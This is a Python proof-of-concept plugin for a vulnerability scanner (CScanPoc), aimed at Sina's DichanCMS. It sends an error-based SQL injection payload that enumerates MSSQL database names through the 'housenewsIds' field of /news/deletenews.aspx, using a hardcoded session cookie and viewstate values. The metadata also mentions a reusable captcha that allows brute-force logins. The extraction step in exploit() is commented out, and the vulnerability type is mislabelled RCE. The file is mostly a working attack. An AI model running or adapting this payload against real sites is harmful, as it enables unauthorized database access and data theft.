# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DichanCMS_0101'  # 平台漏洞编号
    name = '新浪地产CMS存设计缺陷和多处sql注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
    新浪地产CMS存设计缺陷和多处sql注入，
    设计缺陷出现在登录时图片验证码使用一次未失效，可撞库和暴破。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=196430'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DichanCMS'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8b20726e-291b-4c7b-994d-a84f32dcf840'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            headers = {
                'Cookie': 'ASP.NET_SessionId=adg4hn45zmhams55u50mil45; .dichancmsauth=994F1406866FA51A1EF32B936496199631077780812E3830EBE65D54D52FB04F3C216D0FDC8256BA7CAC46C0DC4DC5376641396484DAE46DFB6C09C1CD24E7EA70FA50877E567F584A097E8006E539BCBB907765ED9E4B7096F89B393EB77543AC9CBE7F; __utmt=1; __utma=21884462.522624074.1460635410.1460635410.1460635410.1; __utmb=21884462.2.10.1460635410; __utmc=21884462; __utmz=21884462.1460635410.1.1.utmcsr=cms.dichan.com|utmccn=(referral)|utmcmd=referral|utmcct=/comment/newscommentlist.aspx'}
            for i in range(1, 14):
                payload = '0/(select top 1 name from master..sysdatabases where name not in (select top %s name from master..sysdatabases))' % i
                body = {'__VIEWSTATE': '/wEPDwUKMTkwNjc4NTIwMWRkXGYxEvkDlDR5TJiN9oPRDcCJMgo=',
                        '__VIEWSTATEGENERATOR': '59FA1B9F',
                        '__EVENTVALIDATION': '/wEWAwKqv92KDALZifH9CgKM54rGBghPZBNspYOcVa/5oCp6+cB/NDlD',
                        'housenewsIds': payload, 'Button1': '%E7%A1%AE%E5%AE%9A'}
                url = self.target + '/news/deletenews.aspx'
                conn = requests.post(
                    url, data=body, headers=headers, verify=False, allow_redirects=False)
                # conn.close()
                if conn.status_code == 200 and "master..sysdatabases" in conn.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞, url={url}'.format(
                        target=self.target, name=self.vuln.name, url=url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            databases = list()
            headers = {
                'Cookie': 'ASP.NET_SessionId=adg4hn45zmhams55u50mil45; .dichancmsauth=994F1406866FA51A1EF32B936496199631077780812E3830EBE65D54D52FB04F3C216D0FDC8256BA7CAC46C0DC4DC5376641396484DAE46DFB6C09C1CD24E7EA70FA50877E567F584A097E8006E539BCBB907765ED9E4B7096F89B393EB77543AC9CBE7F; __utmt=1; __utma=21884462.522624074.1460635410.1460635410.1460635410.1; __utmb=21884462.2.10.1460635410; __utmc=21884462; __utmz=21884462.1460635410.1.1.utmcsr=cms.dichan.com|utmccn=(referral)|utmcmd=referral|utmcct=/comment/newscommentlist.aspx'}
            for i in range(1, 14):
                payload = '0/(select top 1 name from master..sysdatabases where name not in (select top %s name from master..sysdatabases))' % i
                body = {'__VIEWSTATE': '/wEPDwUKMTkwNjc4NTIwMWRkXGYxEvkDlDR5TJiN9oPRDcCJMgo=',
                        '__VIEWSTATEGENERATOR': '59FA1B9F',
                        '__EVENTVALIDATION': '/wEWAwKqv92KDALZifH9CgKM54rGBghPZBNspYOcVa/5oCp6+cB/NDlD',
                        'housenewsIds': payload, 'Button1': '%E7%A1%AE%E5%AE%9A'}
                url = self.target + '/news/deletenews.aspx'
                conn = requests.post(
                    url, data=body, headers=headers, verify=False, allow_redirects=False)
                html_doc = conn.text
                conn.close()
                if conn.status_code == 200 and "master..sysdatabases" in conn.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;遍历的数据为:{database}, url={url}'.format(
                        target=self.target, name=self.vuln.name, database=databases, url=url))
                # get tables from response
                # begain = html_doc.index('nvarchar')
                # end = html_doc.index('int')
                # database = html_doc[begain + 14:end - 24]
                # databases.append(database)
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
